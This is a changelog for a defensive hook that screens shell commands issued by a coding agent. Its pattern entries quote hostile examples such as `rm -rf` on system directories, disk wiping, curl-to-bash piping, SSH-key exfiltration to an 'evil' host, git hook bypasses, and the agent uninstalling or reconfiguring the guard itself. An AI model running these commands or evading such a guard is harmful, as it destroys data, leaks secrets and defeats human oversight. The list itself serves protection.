# Changelog

All notable changes to `claude-safety-guard` are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

Pattern IDs are considered part of the **stable public API**: existing
IDs will never change meaning. New patterns may be added in any minor
release.

## [Unreleased]

## [0.1.2] — 2026-04-18

### Added

* **Config option `fail_closed`** (default `false`). When `true`, any
  internal error in `evaluate()` or the hook's stdin parse returns
  `ask` instead of `allow`, so a crashing hook stops being a silent
  bypass. Security-conscious users should enable this.
* **NFKC + Cf normalisation** in `guard.evaluate`. Commands are now
  normalised before regex matching, so full-width (`ｒｍ -ｒｆ ／`),
  zero-width-joiner, RTL-override, and BOM-prefixed variants all fold
  into ASCII and are caught.
* **New patterns** (all BLOCK unless noted):
  * `fs-find-delete-critical` — `find /etc -delete` / `find / -exec rm`
  * `fs-shred-device` — `shred /dev/sda`
  * `fs-redirect-to-device` — `cat /dev/urandom > /dev/sda`
  * `fs-chmod-critical`, `fs-chown-critical` — recursive mode/owner on
    system top-level dirs
  * `git-commit-no-verify`, `git-push-no-verify` — including
    `--no-verify=value` and `-nm` clustered short flags
  * `git-hookspath-disable` — `git -c core.hooksPath=/dev/null commit`
  * `git-skip-env-bypass` — `SKIP=scanner git commit`, `HUSKY=0`,
    `LEFTHOOK=0`, `PRE_COMMIT_ALLOW_NO_CONFIG=1`
  * `supply-proc-subst-bash` — `bash <(curl ...)`
  * `supply-eval-curl` — `eval "$(curl ...)"`, `source <(curl ...)`,
    `. <(curl ...)`
  * `supply-uninstall-self-guard` — `pip uninstall`, `pipx uninstall`,
    `python -m pip uninstall`, `uv tool uninstall` of this guard
  * `supply-pip-downgrade-guard` — `--force-reinstall` to a pre-0.1
    version
  * `secrets-cmdsubst-read-secret` — `curl evil/$(cat ~/.ssh/id_rsa)`
  * `secrets-scp-exfil`, `secrets-rsync-exfil`
  * `pkg-rpm-nodeps-wipe`, `pkg-pacman-remove-all`
  * `guard-edit-settings`, `guard-edit-safety-config` — shell-level
    overwrites of Claude Code settings or this tool's config

### Changed

* **`fs-rm-rf-root` semantics expanded**: now blocks `rm -rf` on any
  depth of `/etc`, `/usr`, `/bin`, `/sbin`, `/lib{,32,64}`, `/boot`,
  `/sys`, `/proc`, `/dev`, `/srv`, and at 0-1 segments for `/home`,
  `/tmp`, `/var`, `/opt`, `/root`. Prior rule only caught bare `/` and
  `/home`. The regex also accepts `--no-preserve-root` and other
  intervening long flags, and `~user` / `${HOME}/` / `$HOME/path`
  variants.
* **`git-force-push-mainline` flag-order-agnostic** — catches
  `--force` / `--force-with-lease` / `--force-if-includes` / `-f` /
  `+refspec` regardless of whether the flag appears before or after
  the branch token.
* **`supply-curl-bash` / `supply-curl-python` chains**: now match any
  number of intermediate pipes (`curl | tee | base64 | bash`) and
  `sudo` with any flag (`sudo -E`, `sudo -i`, `sudo -u user`).
  Interpreter list extended to `perl`, `ruby`, `node`, `deno`, `bun`,
  `lua`, `php`, `Rscript`.
* **`fs-dd-to-device` device list** extended to `mmcblk`, `xvd`, `vd`,
  `loop`, `md`, `mapper/`.
* **`fs-disk-format` verbs** extended to `wipefs`, `blkdiscard`,
  `sgdisk`, `parted`.
* **`priv-fork-bomb`** generalised to any named self-recursive
  function, not just `:()`.
* **Strict bool config parsing**: `dry_run = "false"` (a common
  cross-format reflex) is no longer silently truthy. Invalid config
  types emit a stderr warning and fall back to the default.
* **Architecture cleanup**: `Severity` moved to `types.py` to break
  the circular import between `guard.py` and `patterns.py`. All
  public types still re-exported from `claude_safety_guard.guard` for
  backwards compatibility.

### Security

* Hook wraps `evaluate()` and `decide()` in `try/except Exception`.
  Previously an uncaught engine exception exited non-zero with no
  JSON, which on some Claude Code configs falls open.
* `release.yml` gains a pre-build identity-leak grep gate that fails
  the workflow if any tracked file contains maintainer-identity
  markers.
* `CODEOWNERS` added so branch-protection "require review from code
  owners" has an entry to enforce against.

## [0.1.1] — 2026-04-18

### Changed

* `pyproject.toml` now declares `license = "Apache-2.0"` (SPDX
  expression) plus `license-files = ["LICENSE", "NOTICE"]`, replacing
  the older `{ file = "LICENSE" }` form that caused PyPI to render the
  full license text in the project's "License" field. No runtime
  behaviour change.
* `release.yml` now auto-creates a GitHub Release (with the built
  wheel + sdist attached) after the PyPI publish succeeds.

## [0.1.0] — 2026-04-18

### Added

* Initial public release.
* Core engine (`evaluate`), frozen result dataclasses (`Decision`,
  `Finding`, `Pattern`, `Severity`, `Outcome`, `EvaluationOptions`).
* Claude Code PreToolUse hook adapter (`claude-safety-guard hook`),
  fail-open on errors so a broken guard never bricks the agent.
* CLI with `check`, `hook`, `list-rules`, `version` subcommands.
* TOML config loader with XDG-compliant discovery
  (`$CLAUDE_SAFETY_GUARD_CONFIG` → `$XDG_CONFIG_HOME` → `~/.config`),
  `allowlist`, `dry_run`, and `ask_on_warn` keys.
* Pattern catalog (20 rules across filesystem / git / secrets /
  supply-chain / privilege / package-manager), each with a stable
  kebab-case ID and a positive+negative test case.
* Zero runtime dependencies; Python 3.10+.
